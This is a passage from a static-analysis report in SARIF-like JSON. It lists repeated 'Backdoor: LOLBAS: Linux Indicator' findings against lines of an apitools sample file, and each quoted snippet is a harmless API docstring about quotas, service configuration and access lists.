            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2534,
                  "startColumn": 20,
                  "endLine": 2534,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n  Fields:\n    accessList: ACL for access to the unrestricted surface of the service.\n    serviceName: The service protected by this policy.\n    visibilityLabelAccessLists: ACLs for access to restricted parts of the\n      service.  The map key is the visibility label that is being controlled.\n      Note that access to any label also implies access to the unrestricted\n",
                    "rendered": {
                      "text": "\n  Fields:\n    accessList: ACL for access to the unrestricted surface of the service.\n    serviceName: The service protected by this policy.\n    visibilityLabelAccessLists: ACLs for access to restricted parts of the\n      service.  The map key is the visibility label that is being controlled.\n      Note that access to any label also implies access to the unrestricted\n",
                      "markdown": "`\n  Fields:\n    accessList: ACL for access to the unrestricted surface of the service.\n    serviceName: The service protected by this policy.\n    visibilityLabelAccessLists: ACLs for access to restricted parts of the\n      service.  The map key is the visibility label that is being controlled.\n      Note that access to any label also implies access to the unrestricted\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2523,
                  "startColumn": 40,
                  "endLine": 2523,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\n\nclass ServiceAccessPolicy(_messages.Message):\n  r\"\"\"Policy describing who can access a service and any visibility labels on\n  that service.\n\n  Messages:\n",
                    "rendered": {
                      "text": "\n\nclass ServiceAccessPolicy(_messages.Message):\n  r\"\"\"Policy describing who can access a service and any visibility labels on\n  that service.\n\n  Messages:\n",
                      "markdown": "`\n\nclass ServiceAccessPolicy(_messages.Message):\n  r\"\"\"Policy describing who can access a service and any visibility labels on\n  that service.\n\n  Messages:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2506,
                  "startColumn": 59,
                  "endLine": 2506,
                  "endColumn": 68,
                  "snippet": {
                    "text": "\n\nclass ServiceAccessList(_messages.Message):\n  r\"\"\"List of users and groups that are granted access to a service or\n  visibility label.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\n\nclass ServiceAccessList(_messages.Message):\n  r\"\"\"List of users and groups that are granted access to a service or\n  visibility label.\n\n  Fields:\n",
                      "markdown": "`\n\nclass ServiceAccessList(_messages.Message):\n  r\"\"\"List of users and groups that are granted access to a service or\n  visibility label.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2456,
                  "startColumn": 53,
                  "endLine": 2456,
                  "endColumn": 62,
                  "snippet": {
                    "text": "    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n      manage consumption of the service, etc.\n    projectProperties: Configuration of per-consumer project properties.\n    quota: Quota configuration.\n",
                    "rendered": {
                      "text": "    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n      manage consumption of the service, etc.\n    projectProperties: Configuration of per-consumer project properties.\n    quota: Quota configuration.\n",
                      "markdown": "`    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n      manage consumption of the service, etc.\n    projectProperties: Configuration of per-consumer project properties.\n    quota: Quota configuration.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2453,
                  "startColumn": 39,
                  "endLine": 2453,
                  "endColumn": 48,
                  "snippet": {
                    "text": "      This is required by the Service.monitoring and Service.logging\n      configurations.\n    monitoring: Monitoring configuration of the service.\n    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n",
                    "rendered": {
                      "text": "      This is required by the Service.monitoring and Service.logging\n      configurations.\n    monitoring: Monitoring configuration of the service.\n    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n",
                      "markdown": "`      This is required by the Service.monitoring and Service.logging\n      configurations.\n    monitoring: Monitoring configuration of the service.\n    name: The DNS address at which this service is available, e.g.\n      `calendar.googleapis.com`.\n    producerProjectId: The id of the Google developer project that owns the\n      service. Members of this project can manage the service configuration,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2434,
                  "startColumn": 34,
                  "endLine": 2434,
                  "endColumn": 43,
                  "snippet": {
                    "text": "      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n    context: Context configuration.\n    control: Configuration for the service control plane.\n    customError: Custom error configuration.\n    documentation: Additional API documentation.\n    enums: A list of all enum types included in this API service.  Enums\n",
                    "rendered": {
                      "text": "      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n    context: Context configuration.\n    control: Configuration for the service control plane.\n    customError: Custom error configuration.\n    documentation: Additional API documentation.\n    enums: A list of all enum types included in this API service.  Enums\n",
                      "markdown": "`      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n    context: Context configuration.\n    control: Configuration for the service control plane.\n    customError: Custom error configuration.\n    documentation: Additional API documentation.\n    enums: A list of all enum types included in this API service.  Enums\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2429,
                  "startColumn": 37,
                  "endLine": 2429,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    authentication: Auth configuration.\n    backend: API backend configuration.\n    billing: Billing configuration of the service.\n    configVersion: The version of the service configuration. The config\n      version may influence interpretation of the configuration, for example,\n      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n",
                    "rendered": {
                      "text": "    authentication: Auth configuration.\n    backend: API backend configuration.\n    billing: Billing configuration of the service.\n    configVersion: The version of the service configuration. The config\n      version may influence interpretation of the configuration, for example,\n      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n",
                      "markdown": "`    authentication: Auth configuration.\n    backend: API backend configuration.\n    billing: Billing configuration of the service.\n    configVersion: The version of the service configuration. The config\n      version may influence interpretation of the configuration, for example,\n      to determine defaults. This is documented together with applicable\n      options. The current default for the config version itself is `3`.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2412,
                  "startColumn": 40,
                  "endLine": 2412,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\nclass Service(_messages.Message):\n  r\"\"\"`Service` is the root object of the configuration schema. It describes\n  basic information like the name of the service and the exposed API\n  interfaces, and delegates other aspects to configuration sub-sections.\n  Example:      type: google.api.Service     config_version: 1     name:\n  calendar.googleapis.com     title: Google Calendar API     apis:     - name:\n",
                    "rendered": {
                      "text": "\nclass Service(_messages.Message):\n  r\"\"\"`Service` is the root object of the configuration schema. It describes\n  basic information like the name of the service and the exposed API\n  interfaces, and delegates other aspects to configuration sub-sections.\n  Example:      type: google.api.Service     config_version: 1     name:\n  calendar.googleapis.com     title: Google Calendar API     apis:     - name:\n",
                      "markdown": "`\nclass Service(_messages.Message):\n  r\"\"\"`Service` is the root object of the configuration schema. It describes\n  basic information like the name of the service and the exposed API\n  interfaces, and delegates other aspects to configuration sub-sections.\n  Example:      type: google.api.Service     config_version: 1     name:\n  calendar.googleapis.com     title: Google Calendar API     apis:     - name:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2400,
                  "startColumn": 18,
                  "endLine": 2400,
                  "endColumn": 24,
                  "snippet": {
                    "text": "  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n\n",
                      "markdown": "`  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2399,
                  "startColumn": 18,
                  "endLine": 2399,
                  "endColumn": 24,
                  "snippet": {
                    "text": "\n  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n",
                    "rendered": {
                      "text": "\n  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n",
                      "markdown": "`\n  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2398,
                  "startColumn": 16,
                  "endLine": 2398,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  r\"\"\"Specifies the used quota amount for a quota limit at a particular time.\n\n  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n",
                    "rendered": {
                      "text": "  r\"\"\"Specifies the used quota amount for a quota limit at a particular time.\n\n  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n",
                      "markdown": "`  r\"\"\"Specifies the used quota amount for a quota limit at a particular time.\n\n  Fields:\n    endTime: The time the quota duration ended.\n    queryTime: The time the quota usage data was queried.\n    startTime: The time the quota duration started.\n    usage: The used quota value at the \"query_time\".\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2362,
                  "startColumn": 45,
                  "endLine": 2362,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n\n    Messages:\n",
                    "rendered": {
                      "text": "    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n\n    Messages:\n",
                      "markdown": "`    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n\n    Messages:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2359,
                  "startColumn": 63,
                  "endLine": 2360,
                  "snippet": {
                    "text": "    consumers to cap their usage voluntarily.  The key for this map is one of\n    the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within\n    quota groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n",
                    "rendered": {
                      "text": "    consumers to cap their usage voluntarily.  The key for this map is one of\n    the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within\n    quota groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n",
                      "markdown": "`    consumers to cap their usage voluntarily.  The key for this map is one of\n    the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within\n    quota groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2328,
                  "startColumn": 37,
                  "endLine": 2328,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    r\"\"\"The effective quota limits for each group, derived from the service\n    defaults together with any producer or consumer overrides. For each limit,\n    the effective value is the minimum of the producer and consumer overrides\n    if either is present, or else the service default if neither is present.\n    DEPRECATED. Use effective_quota_groups instead.\n\n    Messages:\n",
                    "rendered": {
                      "text": "    r\"\"\"The effective quota limits for each group, derived from the service\n    defaults together with any producer or consumer overrides. For each limit,\n    the effective value is the minimum of the producer and consumer overrides\n    if either is present, or else the service default if neither is present.\n    DEPRECATED. Use effective_quota_groups instead.\n\n    Messages:\n",
                      "markdown": "`    r\"\"\"The effective quota limits for each group, derived from the service\n    defaults together with any producer or consumer overrides. For each limit,\n    the effective value is the minimum of the producer and consumer overrides\n    if either is present, or else the service default if neither is present.\n    DEPRECATED. Use effective_quota_groups instead.\n\n    Messages:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2325,
                  "startColumn": 67,
                  "endLine": 2326,
                  "snippet": {
                    "text": "\n  @encoding.MapUnrecognizedFields('additionalProperties')\n  class EffectiveQuotasValue(_messages.Message):\n    r\"\"\"The effective quota limits for each group, derived from the service\n    defaults together with any producer or consumer overrides. For each limit,\n    the effective value is the minimum of the producer and consumer overrides\n    if either is present, or else the service default if neither is present.\n    DEPRECATED. Use effective_quota_groups instead.\n",
                    "rendered": {
                      "text": "\n  @encoding.MapUnrecognizedFields('additionalProperties')\n  class EffectiveQuotasValue(_messages.Message):\n    r\"\"\"The effective quota limits for each group, derived from the service\n    defaults together with any producer or consumer overrides. For each limit,\n    the effective value is the minimum of the producer and consumer overrides\n    if either is present, or else the service default if neither is present.\n    DEPRECATED. Use effective_quota_groups instead.\n",
                      "markdown": "`\n  @encoding.MapUnrecognizedFields('additionalProperties')\n  class EffectiveQuotasValue(_messages.Message):\n    r\"\"\"The effective quota limits for each group, derived from the service\n    defaults together with any producer or consumer overrides. For each limit,\n    the effective value is the minimum of the producer and consumer overrides\n    if either is present, or else the service default if neither is present.\n    DEPRECATED. Use effective_quota_groups instead.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2298,
                  "startColumn": 45,
                  "endLine": 2298,
                  "endColumn": 54,
                  "snippet": {
                    "text": "    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n\n    Messages:\n",
                    "rendered": {
                      "text": "    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n\n    Messages:\n",
                      "markdown": "`    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n\n    Messages:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2295,
                  "startColumn": 63,
                  "endLine": 2296,
                  "snippet": {
                    "text": "    producer override, if one exists.  The key for this map is one of the\n    following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within quota\n    groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n",
                    "rendered": {
                      "text": "    producer override, if one exists.  The key for this map is one of the\n    following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within quota\n    groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n",
                      "markdown": "`    producer override, if one exists.  The key for this map is one of the\n    following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within quota\n    groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n    LIMIT_NAME is the google.api.QuotaLimit.name field from the service\n    config.  For example: 'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for\n    quotas defined without quota groups, where LIMIT_NAME is the\n    google.api.QuotaLimit.name field from the service config. For example:\n    'borrowedCountPerOrganization'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2291,
                  "startColumn": 50,
                  "endLine": 2291,
                  "endColumn": 59,
                  "snippet": {
                    "text": "  @encoding.MapUnrecognizedFields('additionalProperties')\n  class ConsumerOverridesValue(_messages.Message):\n    r\"\"\"Quota overrides set by the consumer. Consumer overrides will only have\n    an effect up to the max_limit specified in the service config, or the the\n    producer override, if one exists.  The key for this map is one of the\n    following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within quota\n    groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n",
                    "rendered": {
                      "text": "  @encoding.MapUnrecognizedFields('additionalProperties')\n  class ConsumerOverridesValue(_messages.Message):\n    r\"\"\"Quota overrides set by the consumer. Consumer overrides will only have\n    an effect up to the max_limit specified in the service config, or the the\n    producer override, if one exists.  The key for this map is one of the\n    following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within quota\n    groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n",
                      "markdown": "`  @encoding.MapUnrecognizedFields('additionalProperties')\n  class ConsumerOverridesValue(_messages.Message):\n    r\"\"\"Quota overrides set by the consumer. Consumer overrides will only have\n    an effect up to the max_limit specified in the service config, or the the\n    producer override, if one exists.  The key for this map is one of the\n    following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas defined within quota\n    groups, where GROUP_NAME is the google.api.QuotaGroup.name field and\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2284,
                  "startColumn": 63,
                  "endLine": 2284,
                  "endColumn": 69,
                  "snippet": {
                    "text": "      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    variableTermQuotas: Quotas that are active over a specified time period.\n      Only writeable by the producer.\n  \"\"\"\n\n",
                    "rendered": {
                      "text": "      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    variableTermQuotas: Quotas that are active over a specified time period.\n      Only writeable by the producer.\n  \"\"\"\n\n",
                      "markdown": "`      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    variableTermQuotas: Quotas that are active over a specified time period.\n      Only writeable by the producer.\n  \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2283,
                  "startColumn": 14,
                  "endLine": 2283,
                  "endColumn": 23,
                  "snippet": {
